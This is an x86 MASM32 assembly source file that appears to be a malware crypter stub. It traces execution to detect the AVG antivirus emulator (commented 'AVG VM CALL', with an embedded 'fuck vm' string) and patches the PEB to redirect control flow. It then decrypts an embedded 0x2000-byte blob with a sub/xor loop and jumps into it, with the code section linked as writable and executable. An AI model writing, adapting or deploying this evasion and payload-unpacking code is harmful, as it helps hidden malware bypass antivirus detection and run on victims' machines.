	.686
	.model flat, stdcall
	option casemap :none
	
	include \masm32\include\ntdll.inc
	includelib \masm32\lib\ntdll.lib

	include \masm32\include\kernel32.inc
	includelib \masm32\lib\kernel32.lib
.data
	include Cry.inc
	
.code
; LINK: /SECTION:.text,ERW
;
Buffer	BYTE 32 DUP (?)	; 16, MAX_IP_LENGTH

	include VMBE2.inc
	
Tclbk proc Arg:PVOID, Ip:PVOID, State:PTSTATE
	mov ecx,Ip
	xor eax,eax
	.if W[Ecx] == 0BBF0H	; AVG VM CALL
		inc eax
	.endif
	ret
Tclbk endp

_imp__RtlGetCurrentPeb proto

Gate proc C
	ret
Gate endp

EP proc C
	push 0	; @Arg's
	push 0	; Arg num.
	push 0	; Callback arg.
	push offset Tclbk
	push D[_imp__RtlGetCurrentPeb]	; Ip
	push offset Buffer
	Call MI
	pop ecx

	assume fs:nothing
	assume eax:PPEB
	mov ecx,fs:[TEB.Peb]
	mov ebx,12345678H
	xchg D[ecx],ebx
	
	mov eax,D[eax]
	add eax,(offset Ip - 12345678H)
	jmp eax
	db "idle"
	db "fuck vm"
Ip:
	
	mov ecx,2000H
	.repeat
		sub byte ptr [ecx + offset Dump - 1],cl
		xor byte ptr [ecx + offset Dump - 1],cl
		dec ecx
	.until Zero?
	lea ebx,Dump
	lea ebx,[ebx + 600H]
	jmp Ebx
EP endp
end EP